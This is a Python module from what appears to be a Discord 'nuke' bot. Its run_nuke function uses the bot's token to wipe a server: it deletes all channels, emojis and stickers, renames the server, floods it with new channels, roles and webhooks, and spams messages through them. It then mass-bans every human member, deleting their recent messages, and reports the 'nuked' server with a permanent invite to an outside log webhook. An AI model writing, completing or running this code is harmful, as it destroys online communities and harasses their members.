from __future__ import annotations

import asyncio
import logging
from asyncio import Event, gather, timeout
from typing import Any

from aiohttp import ClientSession
from discord import SeparatorSpacingSize
from discord.ui import Container, Separator, TextDisplay

from nuke import channels, events, roles, spam, webhooks
from nuke.config import _avatar_pool
from nuke.config import get as nuke_cfg
from nuke.profile import _avatar_cache, disable_features, fetch_b64
from utils.log_webhook import send as log_send

_BAN_PERM = 0x0000000000000004

_states = None  # initialized in run_nuke
_stop_flags: dict[int, bool] = {}


async def _send_nuke_embed(
    bot: Any,
    guild_id: int,
    invite_url: str,
    guild_name: str,
    owner_id: int,
    member_count: int,
) -> None:
    url = getattr(bot.cfg, "nuke_logs", "")
    if not url:
        return
    container = Container(
        TextDisplay(content=f"# server nuked! {guild_name}\n{invite_url}"),
        Separator(divider=True, spacing=SeparatorSpacingSize.small),
        TextDisplay(content=f"owner: <@{owner_id}>\nmembers: {member_count}"),
    )
    payload = {
        "flags": 32768,
        "components": [container.to_component_dict()],
    }
    asyncio.create_task(log_send(url, payload))


async def _rename_guild(
    limiter: Any, guild_id: int, name: str, icon_b64: str | None, headers: dict
) -> None:
    payload: dict = {"name": name}
    if icon_b64:
        payload["icon"] = icon_b64
    try:
        async with timeout(10):
            res = await limiter.request(
                "PATCH",
                f"guilds:{guild_id}:edit",
                f"https://discord.com/api/v10/guilds/{guild_id}",
                json=payload,
                headers=headers,
            )
            if res.status not in (200, 201):
                await res.text()
    except TimeoutError:
        logging.error(f"nuke [{guild_id}]: guild rename timed out")
    except Exception as e:
        logging.error(f"nuke [{guild_id}]: guild rename error: {e}")


async def run_nuke(bot: Any, guild_id: int, guild: Any = None, manual: bool = False) -> None:
    nc = nuke_cfg()
    c = bot.cfg
    limiter = bot.http.fast_limiter
    token = bot.http.token
    headers = {"Authorization": f"Bot {token}"} if token else {}

    total_channels = nc.channel_count
    max_spam_batches = nc.message_count

    async def ban_mass() -> None:
        if not manual:
            return
        g = bot.get_guild(guild_id)
        if not g:
            return
        try:
            async for m in g.fetch_members(limit=None):
                if not m.bot:
                    try:
                        await g.ban(
                            m,
                            reason="nuked by 767",
                            delete_message_days=7,
                        )
                    except Exception:
                        pass
        except Exception as e:
            logging.error(f"nuke [{guild_id}]: mass ban failed: {e}")

    session: ClientSession
    async with ClientSession() as s:
        session = s
        _avatar_cache.bind(session)

        icon_b64 = await fetch_b64(nc.icon_url, session) if nc.icon_url else None

        await _avatar_cache.prefetch(_avatar_pool)

        try:
            async with timeout(10):
                await gather(
                    disable_features(limiter, guild_id, headers),
                )

        except TimeoutError:
            logging.error(f"nuke [{guild_id}]: disable features timed out")
        except Exception as e:
            logging.error(f"nuke [{guild_id}]: disable features failed: {e}")
        await _rename_guild(limiter, guild_id, nc.server_name, icon_b64, headers)

        async def wipe_emojis_and_stickers():
            try:
                async with timeout(10):
                    res = await limiter.request(
                        "DELETE",
                        f"guilds:{guild_id}:emojis:del",
                        f"https://discord.com/api/v10/guilds/{guild_id}/emojis",
                        headers=headers,
                    )
                    if res.status not in (200, 204):
                        await res.text()
            except TimeoutError:
                logging.error(f"nuke [{guild_id}]: emoji delete timed out")
            except Exception as e:
                logging.error(f"nuke [{guild_id}]: emoji delete error: {e}")

            try:
                async with timeout(10):
                    res = await limiter.request(
                        "DELETE",
                        f"guilds:{guild_id}:stickers:del",
                        f"https://discord.com/api/v10/guilds/{guild_id}/stickers",
                        headers=headers,
                    )
                    if res.status not in (200, 204):
                        await res.text()
            except TimeoutError:
                logging.error(f"nuke [{guild_id}]: sticker delete timed out")
            except Exception as e:
                logging.error(f"nuke [{guild_id}]: sticker delete error: {e}")

        emoji_wipe_task = asyncio.create_task(wipe_emojis_and_stickers())

        if guild is None:
            guild = bot.get_guild(guild_id)
        existing_channels = [{"id": c.id} for c in guild.channels] if guild else []

        channels_done = Event()
        webhook_trigger = Event()
        webhooks_created = Event()
        all_webhooks: list[Any] = []
        all_channel_ids: list[str] = []
        pending_channels: list[str] = []
        channel_lock = asyncio.Lock()

        async def nuke_channels():
            try:
                await channels.delete_all(limiter, guild_id, existing_channels, headers)
            except Exception as e:
                logging.error(f"nuke [{guild_id}]: channel delete failed: {e}")

            category_ids: list[str] = []
            if nc.category_count > 0:
                try:
                    async with timeout(30):
                        category_ids = await channels.create_categories(
                            limiter,
                            guild_id,
                            nc.category_count,
                            headers,
                        )
                except TimeoutError:
                    logging.error(f"nuke [{guild_id}]: category create timed out")
                except Exception as e:
                    logging.error(f"nuke [{guild_id}]: category create failed: {e}")

            try:
                async with timeout(60):
                    ids = await channels.create_many(
                        limiter,
                        guild_id,
                        total_channels,
                        headers,
                        on_create=lambda ch_id: pending_channels.append(ch_id),
                        on_threshold=lambda: webhook_trigger.set(),
                        category_ids=category_ids,
                    )
                all_channel_ids.extend(ids)
                channels_done.set()

            except TimeoutError:
                logging.error(f"nuke [{guild_id}]: channel create timed out")
            except Exception as e:
                logging.error(f"nuke [{guild_id}]: channel create failed: {e}")

        async def create_roles():
            await roles.create_many(limiter, guild_id, nc.role_count, headers)

        async def setup_webhooks():
            await webhook_trigger.wait()
            webhook_ids = all_channel_ids[:50]
            wbs = await webhooks.create_many(
                limiter, guild_id, webhook_ids, session, headers
            )
            all_webhooks.extend(wbs)
            webhooks_created.set()

            g = bot.get_guild(guild_id)
            if g:
                inv_ch = g.get_channel(int(webhook_ids[0])) if webhook_ids else None
                if inv_ch:
                    try:
                        inv = await inv_ch.create_invite(max_age=0, max_uses=0)
                        await _send_nuke_embed(
                            bot=bot,
                            guild_id=guild_id,
                            invite_url=inv.url,
                            guild_name=g.name,
                            owner_id=g.owner_id,
                            member_count=g.member_count,
                        )
                    except Exception:
                        pass

        async def spam_pending_channels():

            while not channels_done.is_set():
                async with channel_lock:
                    if pending_channels:
                        ids_to_spam = pending_channels[:]
                        pending_channels.clear()
                    else:
                        ids_to_spam = []
                if ids_to_spam:
                    try:
                        await spam.blast(
                            limiter, guild_id, [], ids_to_spam, headers, session
                        )
                    except Exception as e:
                        logging.error(f"nuke [{guild_id}]: channel spam error: {e}")
                await asyncio.sleep(0.001)
            await webhooks_created.wait()
            direct_ids = all_channel_ids[50:]

            _stop_flags[guild_id] = False
            batches_done = 0
            batch_tasks = []
            while batches_done < max_spam_batches and not _stop_flags.get(
                guild_id, False
            ):
                batch_tasks.append(
                    asyncio.create_task(
                        spam.blast(
                            limiter,
                            guild_id,
                            all_webhooks,
                            direct_ids,
                            headers,
                            session,
                        )
                    )
                )
                batches_done += 1
            if batch_tasks:
                await gather(*batch_tasks, return_exceptions=True)

        async def first_webhook_blast():
            await webhooks_created.wait()
            direct_ids = all_channel_ids[50:]

            await spam.blast(
                limiter, guild_id, all_webhooks, direct_ids, headers, session
            )

        async def create_scheduled_event():
            await channels_done.wait()
            try:
                async with timeout(10):
                    await events.create(limiter, guild_id, headers)

            except TimeoutError:
                logging.error(f"nuke [{guild_id}]: event create timed out")
            except Exception as e:
                logging.error(f"nuke [{guild_id}]: event create failed: {e}")

        channel_deletion_task = asyncio.create_task(nuke_channels())
        role_creation_task = asyncio.create_task(create_roles())
        channel_spam_task = asyncio.create_task(spam_pending_channels())

        await asyncio.gather(channel_deletion_task, role_creation_task)

        webhook_creation_task = asyncio.create_task(setup_webhooks())
        first_blast_task = asyncio.create_task(first_webhook_blast())
        event_creation_task = asyncio.create_task(create_scheduled_event())

        await asyncio.gather(
            webhook_creation_task, first_blast_task, event_creation_task
        )
        await emoji_wipe_task
        await channel_spam_task

    await ban_mass()

    _stop_flags.pop(guild_id, None)
    _avatar_cache.clear()
    from utils.db import db

    if db.cache:
        await db.cache.delete(f"nuke:{guild_id}")

    g = bot.get_guild(guild_id)
    if g:
        try:
            await g.leave()
        except Exception as e:
            logging.warning(f"nuke [{guild_id}]: leave failed: {e}")


async def _none() -> None:
    return None


async def stop(guild_id: int) -> None:
    _stop_flags[guild_id] = True
